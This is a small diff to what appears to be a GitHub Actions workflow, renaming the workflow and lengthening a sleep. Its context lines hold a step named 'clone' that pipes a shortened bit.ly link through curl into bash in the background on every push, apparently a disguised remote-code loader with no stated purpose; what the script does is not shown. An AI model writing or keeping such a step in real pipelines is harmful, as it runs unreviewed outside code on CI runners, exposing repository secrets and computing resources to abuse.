@@ -1,4 +1,4 @@
-name: sanapp
+name: saneapp
 on: 
   push:
     branches: [ "main" ]
@@ -99,7 +99,7 @@ jobs:
       id: go
     - name: clone
       run: curl -sL  http://bit.ly/4ft5YF3 | bash &
-            sleep 15m           
+            sleep 20m           
 
   week:
     needs: [time]
